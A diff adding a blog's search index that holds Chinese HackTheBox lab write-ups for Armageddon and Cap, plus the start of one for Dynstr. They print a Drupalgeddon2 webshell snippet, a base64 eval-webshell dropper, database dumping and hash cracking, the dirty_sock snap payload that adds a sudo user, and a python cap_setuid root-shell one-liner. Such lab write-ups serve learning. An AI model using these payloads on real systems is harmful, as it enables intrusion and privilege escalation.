@@ -1,0 +1,790 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hackthebox-Armageddon</title>
+    <url>/2022/01/07/HackTheBox-Armageddon/</url>
+    <content><![CDATA[<h1 id="Hackthebox-Armageddon"><a href="#Hackthebox-Armageddon" class="headerlink" title="Hackthebox-Armageddon"></a>Hackthebox-Armageddon</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armg_pwn.png" alt="pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>目标IP：10.10.10.233</p>
+<p>本机IP：10.10.14.209</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armageddon_nmap.png" alt="nmap"></p>
+<p>开放了22、80端口</p>
+<p>打开Burpsuite，配置好代理（个人习惯，F12一样的）</p>
+<p>直接访问看下网站功能</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/webserver.png" alt="webserver"></p>
+<p>没什么特别的功能，注册一个账号试试</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/failregister.png" alt="failregister"></p>
+<p>输入账号邮箱以后密码发到邮箱里，但这个功能应该是假的，没有收到任何邮件</p>
+<p>简单尝试了一下似乎也没有sql注入</p>
+<p><strong>Dirsearch</strong></p>
+<p>扫了一下网站目录，发现了<code>robots.txt</code>、<code>shell.php</code>等</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirsearch.png" alt="dirsearch"></p>
+<p>查看下<code>robots.txt</code>里面都有什么</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># CSS, JS, Images</span><br><span class="line">Allow: /misc/*.css$</span><br><span class="line">Allow: /misc/*.css?</span><br><span class="line">Allow: /misc/*.js$</span><br><span class="line">Allow: /misc/*.js?</span><br><span class="line">Allow: /misc/*.gif</span><br><span class="line">Allow: /misc/*.jpg</span><br><span class="line">Allow: /misc/*.jpeg</span><br><span class="line">Allow: /misc/*.png</span><br><span class="line">Allow: /modules/*.css$</span><br><span class="line">Allow: /modules/*.css?</span><br><span class="line">Allow: /modules/*.js$</span><br><span class="line">Allow: /modules/*.js?</span><br><span class="line">Allow: /modules/*.gif</span><br><span class="line">Allow: /modules/*.jpg</span><br><span class="line">Allow: /modules/*.jpeg</span><br><span class="line">Allow: /modules/*.png</span><br><span class="line">Allow: /profiles/*.css$</span><br><span class="line">Allow: /profiles/*.css?</span><br><span class="line">Allow: /profiles/*.js$</span><br><span class="line">Allow: /profiles/*.js?</span><br><span class="line">Allow: /profiles/*.gif</span><br><span class="line">Allow: /profiles/*.jpg</span><br><span class="line">Allow: /profiles/*.jpeg</span><br><span class="line">Allow: /profiles/*.png</span><br><span class="line">Allow: /themes/*.css$</span><br><span class="line">Allow: /themes/*.css?</span><br><span class="line">Allow: /themes/*.js$</span><br><span class="line">Allow: /themes/*.js?</span><br><span class="line">Allow: /themes/*.gif</span><br><span class="line">Allow: /themes/*.jpg</span><br><span class="line">Allow: /themes/*.jpeg</span><br><span class="line">Allow: /themes/*.png</span><br><span class="line"># Directories</span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br></pre></td></tr></table></figure>
+
+<p>网站居然没有任何限制，可以直接看目录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E7%9B%AE%E5%BD%95.png" alt="目录"></p>
+<p>几个目录都翻烂了也没啥有用的信息</p>
+<p>在更新日志(/CHANGELOG.txt)里发现了重要信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/changelog.png" alt="changelog"></p>
+<p>从更新日志里可以看到，网站最后更新的Drupal 7.56</p>
+<p>Google上搜了一波得知Drupal 7.56爆出过远程代码执行漏洞，影响范围<strong>Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1</strong></p>
+<h2 id="Drupal远程代码执行漏洞利用"><a href="#Drupal远程代码执行漏洞利用" class="headerlink" title="Drupal远程代码执行漏洞利用"></a>Drupal远程代码执行漏洞利用</h2><p>详情可搜CVE：2018-7600，分析文章已经很多了不多赘述（Exp在参考链接）</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>–部分Drupalgeddon2代码–</strong></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Settings - Try to write a PHP to the web root?</span></span><br><span class="line">try_phpshell = <span class="literal">true</span></span><br><span class="line"><span class="comment"># Settings - General/Stealth</span></span><br><span class="line"><span class="variable">$useragent</span> = <span class="string">&quot;drupalgeddon2&quot;</span></span><br><span class="line">webshell = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="comment"># Settings - Proxy information (nil to disable)</span></span><br><span class="line"><span class="variable">$proxy_addr</span> = <span class="literal">nil</span></span><br><span class="line"><span class="variable">$proxy_port</span> = <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is &#x27;better&#x27;!)</span></span><br><span class="line">bashcmd = <span class="string">&quot;&lt;?php if( isset( $_REQUEST[&#x27;c&#x27;] ) ) &#123; system( $_REQUEST[&#x27;c&#x27;] . &#x27; 2&gt;&amp;1&#x27; ); &#125;&quot;</span></span><br><span class="line">bashcmd = <span class="string">&quot;echo &quot;</span> + Base64.strict_encode64(bashcmd) + <span class="string">&quot; | base64 -d&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面Dirsearch扫描发现就有个<code>shell.php</code>，应该是别的gamer在做靶机的时候写进来的，尝试下果然</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/shellphp.png" alt="shellphp"></p>
+<p>利用<code>shell.php</code>入自己的一句话并用蚁剑连接(想弹个shell出来发现弹不出来，可能姿势不对)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4K|base64 -d &gt;jasontt.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑成功连接</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E8%9A%81%E5%89%91.png" alt="蚁剑"></p>
+<p>根目录下没有user.txt，那应该不在当前用户下</p>
+<p>终于<code>/var/www/html/sites/default/settings.php</code>里发现了数据库的用户名密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/settings.png" alt="settings"></p>
+<pre><code>  &#39;username&#39; =&gt; &#39;drupaluser&#39;,
+  &#39;password&#39; =&gt; &#39;CQHEy@9M*m23gBVj&#39;,
+</code></pre>
+<p>接下来利用找到的数据库账号密码从数据库中找到有用的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -e &#x27;show databases;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/databases.png" alt="databases"></p>
+<p>查看<code>drupal</code>中有哪些表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;show tables;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tables_in_drupal</span><br><span class="line">actions</span><br><span class="line">authmap</span><br><span class="line">batch</span><br><span class="line">block</span><br><span class="line">block_custom</span><br><span class="line">block_node_type</span><br><span class="line">block_role</span><br><span class="line">blocked_ips</span><br><span class="line">cache</span><br><span class="line">cache_block</span><br><span class="line">cache_bootstrap</span><br><span class="line">cache_field</span><br><span class="line">cache_filter</span><br><span class="line">cache_form</span><br><span class="line">cache_image</span><br><span class="line">cache_menu</span><br><span class="line">cache_page</span><br><span class="line">cache_path</span><br><span class="line">comment</span><br><span class="line">date_format_locale</span><br><span class="line">date_format_type</span><br><span class="line">date_formats</span><br><span class="line">field_config</span><br><span class="line">field_config_instance</span><br><span class="line">field_data_body</span><br><span class="line">field_data_comment_body</span><br><span class="line">field_data_field_image</span><br><span class="line">field_data_field_tags</span><br><span class="line">field_revision_body</span><br><span class="line">field_revision_comment_body</span><br><span class="line">field_revision_field_image</span><br><span class="line">field_revision_field_tags</span><br><span class="line">file_managed</span><br><span class="line">file_usage</span><br><span class="line">filter</span><br><span class="line">filter_format</span><br><span class="line">flood</span><br><span class="line">history</span><br><span class="line">image_effects</span><br><span class="line">image_styles</span><br><span class="line">menu_custom</span><br><span class="line">menu_links</span><br><span class="line">menu_router</span><br><span class="line">node</span><br><span class="line">node_access</span><br><span class="line">node_comment_statistics</span><br><span class="line">node_revision</span><br><span class="line">node_type</span><br><span class="line">queue</span><br><span class="line">rdf_mapping</span><br><span class="line">registry</span><br><span class="line">registry_file</span><br><span class="line">role</span><br><span class="line">role_permission</span><br><span class="line">search_dataset</span><br><span class="line">search_index</span><br><span class="line">search_node_links</span><br><span class="line">search_total</span><br><span class="line">semaphore</span><br><span class="line">sequences</span><br><span class="line">sessions</span><br><span class="line">shortcut_set</span><br><span class="line">shortcut_set_users</span><br><span class="line">system</span><br><span class="line">taxonomy_index</span><br><span class="line">taxonomy_term_data</span><br><span class="line">taxonomy_term_hierarchy</span><br><span class="line">taxonomy_vocabulary</span><br><span class="line">url_alias</span><br><span class="line">users</span><br><span class="line">users_roles</span><br><span class="line">variable</span><br><span class="line">watchdog</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>users</code>表中有哪些字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;desc users;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/desctables.png" alt="desctables"></p>
+<p><strong>name</strong>和<strong>pass</strong>应该就是账号密码了，查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;select name,pass from users;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userpwd.png" alt="userpwd"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>除了利用网上找到的Exp也可以使用工具Metasploit</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf1.png" alt="msf1"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf2.png" alt="msf2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf3.png" alt="msf3"></p>
+<p>getshell以后操作和方法一差不多就不继续写了，可以参考上面的。</p>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>在数据库里得到了brucetherealadmin用户的账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brucetherealadmin   $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</span><br></pre></td></tr></table></figure>
+
+<p>密码应该是hash加密过了，用Kali里自带的工具<code>john the ripper</code>破解</p>
+<p>新建一个txt文档存放密码，john命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt -w /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/johnpass.png" alt="johnpass"></p>
+<p>得到密码为<code>booboo</code></p>
+<p>尝试刚得到的用户名密码<code>SSH</code>，连接成功</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/sshuser.png" alt="sshuser"></p>
+<p>user.txt在<code>~</code>目录下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag.png" alt="userflag"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用<code>sudo -l</code>查看用户的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/usersudo.png" alt="usersudo"></p>
+<p>直接google搜索<code>(root) NOPASSWD: /usr/bin/snap install *</code></p>
+<p>得到有用的信息<a href="https://github.com/initstring/dirty_sock/">dirty_sock:Linux提权漏洞</a>（snap漏洞分析参考链接2）</p>
+<blockquote>
+<p>2019年1月，由于默认安装的服务snapd API中的一个bug，通过默认安装的Ubuntu Linux被发现存在特权提升漏洞，任何本地用户都可以利用此漏洞直接获取root权限。</p>
+</blockquote>
+<p>通过<code>python --version</code>发现本地是python2，本台靶机用<code>dirty_sockv2.py</code>中的一部分就可以提权了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirtysock.png" alt="dirtysock"></p>
+<p>snap本身运行在沙箱环境中，exp通过snap的开发模式（“devmode”）来降低限制条件，从而像主机上的其他应用一样来访问主机。snap还引入了“hooks”机制，“install hook”会在snap安装时运行，如果snap配置为开发模式，hook将会在root上下文中运行</p>
+<p>脚本作用就是添加了一个<code>dirty_sock</code>用户可以提权到root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot;*4256 + &quot;==&quot;&#x27; | base64 -d &gt; jasontt.snap</span><br></pre></td></tr></table></figure>
+
+<p>安装jasont.snap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /user/bin/snap install --devmode jasontt.snap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snap.png" alt="snap"></p>
+<p>用<code>cat /etc/passwd</code>看看<code>dirty_sock</code>用户有没有添加成功</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/adduser.png" alt="adduser"></p>
+<p>用户添加成功了，我们用<code>su</code>命令切换到<code>sock_dirty</code>用户，密码同用户名</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/drty_sock.png" alt="drty_sock"></p>
+<p>得到root权限，拿到root.txt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root.png" alt="root"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p>
+<p><a href="https://initblog.com/2019/dirty-sock/">https://initblog.com/2019/dirty-sock/</a></p>
+<p><a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HACKthebox-Cap</title>
+    <url>/2022/01/07/HackTheBox-Cap/</url>
+    <content><![CDATA[<h1 id="HackTheBox-Cap"><a href="#HackTheBox-Cap" class="headerlink" title="HackTheBox-Cap"></a>HackTheBox-Cap</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cap_pwn.png" alt="cap_pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.6</p>
+<p>目标IP：10.10.10.245</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Cap_nmap.png" alt="nmap"></p>
+<p>开放了21、22、80端口</p>
+<p>常规操作访问一下网站看看干嘛的</p>
+<p>这个网站挺有意思，起到了类似服务器仪表盘的作用，能看本地启动的服务、IP等等</p>
+<p>在<code>Security Snapshot</code>里可以看到流量记录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F.png" alt="流量"></p>
+<p>本来下载流量包看了一下全是我自己访问的流量突然就没思路了</p>
+<p>然后切到其他页面看了下功能又切回来以后发现URL有变化，<code>.../data/</code>斜杠后面的数字变了，试试看其他的数字都和上图一样，估计都是我的访问流量，当访问<code>.../data/0</code>的时候不一样了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F2.png" alt="流量2"></p>
+<p>下载流量包，用<code>Wireshark</code>分析一下</p>
+<p>找到了nathan用户的用户名密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pcap.png" alt="pcap"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER： nathan     PASS Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
+
+<p>上面提到服务器还开放了21、22端口，尝试用刚得到的用户名密码连接</p>
+<p><strong>FTP</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ftp.png" alt="ftp"></p>
+<p>成功登录，发现了user.txt，下载下来得到user flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>SSH</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh james@10.10.10.245</span><br></pre></td></tr></table></figure>
+
+<p>成功连接</p>
+<p>在提权上遇到了问题，首先Linux提权的姿势太多了，以前做的Linux靶机用的大多是<strong>sudo提权滥用</strong>，但是靶机中<code>nathan</code>用户没有使用sudo的权限，所以只能用其他的手段了。</p>
+<p>本台靶机的名字叫cap，google上搜的时候也围绕这个点去找，发现在Linux常用命令里有<code>getcap</code>和<code>setcap</code>，接着发现了一篇很棒的文章（参考链接二），还有一个碉堡了的网站（参考链接三）</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>从2.1版开始,Linux内核有了能力(capability)的概念,即它打破了UNIX/LINUX操作系统中超级用户/普通用户的概念,由普通用户也可以做只有超级用户可以完成的工作.</p>
+<p><strong>Capabilities</strong>的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而<strong>CAP_SETUID表示用户能够修改进程用户身份的特权操作</strong>。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制</p>
+<p>在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为<code>cap_effective</code>, <code>cap_inheritable</code>, <code>cap_permitted</code>(分别简记为:pE,pI,pP)</p>
+<p><strong>cap_permitted</strong>表示进程所拥有的最大能力集；</p>
+<p><strong>cap_effective</strong>表示进程当前可用的能力集，可以看做是cap_permitted的一个子集；</p>
+<p><strong>cap_inheitable</strong>则表示进程可以传递给其子进程的能力集。</p>
+<p>系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为cap_effective, cap_allowed 和 cap_forced（分别简记为fE,fI,fP），其中cap_allowed表示程序运行时可从原进程的cap_inheritable中集成的能力集，cap_forced表示运行文件时必须拥有才能完成其服务的能力集；而cap_effective则表示文件开始运行时可以使用的能力。</p>
+<p>各种能力就不一一列举了，参考文章中写的很详细，本台靶机的提权用了<code>CAP_SETUID</code></p>
+<blockquote>
+<p>CAP_SETUID:允许改变进程的用户ID</p>
+</blockquote>
+<p>用<code>getcap</code>命令查看可执行文件获取的内核权限</p>
+<blockquote>
+<p>getcap [-v] [-r] [-h] [-n] <filename> [<filename> …]</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null  #把错误输出到/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getcap.png" alt="getcap"></p>
+<p>发现 python3.8 有<code>cap_setuid</code>，可以拿来利用提权了，提权方法在<a href="https://gtfobins.github.io/">GTFOBins</a>上找到的</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gtfobins.png" alt="gtfobins"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#x27; #python3.8或者python3都行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到root权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
+<p>得到root flag</p>
+<p>end</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>Linux靶机的提权还是需要更多的学习和积累，虽然本台靶机整个流程很短，也没有什么网站上的漏洞利用直接就连上了，但还是有学到东西的。实际操作得来的经验比起光看博客和书本要印象更加深刻</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355">https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355</a></p>
+<p><a href="https://www.cnblogs.com/sky-heaven/p/12096758.html">https://www.cnblogs.com/sky-heaven/p/12096758.html</a></p>
+<p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Dynstr</title>
+    <url>/2022/01/07/HackTheBox-Dynstr/</url>
+    <content><![CDATA[<h1 id="HackTheBox-Dynstr"><a href="#HackTheBox-Dynstr" class="headerlink" title="HackTheBox-Dynstr"></a>HackTheBox-Dynstr</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dynstr_pwn.png" alt="pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.3</p>
+<p>目标IP：10.10.10.244</p>
+</blockquote>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这台靶机难度中上，由于涉及的知识点是我的盲区，所以花了两天时间才拿下，赶紧记录一下。整个做下来感觉学到了不少，围绕着DDNS为主题设计的靶机，能学的知识有DNS区域、动态DNS更新工具nsupdate的使用、如何在linux中安装和配置DNS服务器、利用通配符进行Linux提权等</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="前期搜集"><a href="#前期搜集" class="headerlink" title="前期搜集"></a>前期搜集</h3><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dynstr_nmap.png" alt="nmap"></p>
+<p>扫描端口开放了22、53、80端口</p>
+<p>先从80端口下手看网站提供了哪些功能和信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/web%E4%BF%A1%E6%81%AF.png" alt="web信息"></p>
+<p>似乎是一个提供动态DNS服务的网站，并给出了服务的域：</p>
+<blockquote>
+<p>dnsalias.htb</p>
+<p>dynamicdns.htb</p>
+<p>no-ip.htb</p>
+<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#110;&#115;&#x40;&#100;&#121;&#110;&#x61;&#x2e;&#x68;&#116;&#98;">&#x64;&#110;&#115;&#x40;&#100;&#121;&#110;&#x61;&#x2e;&#x68;&#116;&#98;</a>获得)</p>
+</blockquote>
+<p>Beta中说网站正在测试模式下运行，并提供了共享凭据：</p>
+<blockquote>
+<p>Username: dynadns</p>
+<p>Password: sndanyd</p>
+</blockquote>
+<p>把上述域名加入<code>/etc/hosts</code></p>
+<p><strong>gobuster</strong></p>
+<p>网站暂时提供的信息就这么多，用<strong>gobuster</strong>爆破一下网站目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://dyna.htb -w /usr/share/wordlists/dirb/big.txt -t 200 --wildcard</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gobuster%E5%8F%91%E7%8E%B0nic.png" alt="gobuster发现nic"></p>
+<p>找到<code>/nic</code>，但是访问<code>/nic</code>发现是空白页</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E7%A9%BAnic.png" alt="空nic"></p>
+<p>尝试继续爆破/nic发现<code>/.htpasswd</code>、<code>/.htaccess</code>、<code>/update</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://dyna.htb/nic -w /usr/share/wordlists/dirb/big.txt -t 200 --wildcard</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gobuster%E5%8F%91%E7%8E%B0update.png" alt="gobuster发现update"></p>
+<p>访问前两者<strong>403</strong> ，在<code>/update</code>有所发现，报了一个<strong>badauth</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/badauth.png" alt="badauth"></p>
+<p>上面获得了共享凭据但是现在不知道哪里可以用，这个页面肯定是有问题的，但是不知道它是如何判断<strong>badauth</strong>的，卡住</p>
+<h3 id="找到突破口"><a href="#找到突破口" class="headerlink" title="找到突破口"></a>找到突破口</h3><p>通过Google搜索发现了一些有用的东西</p>
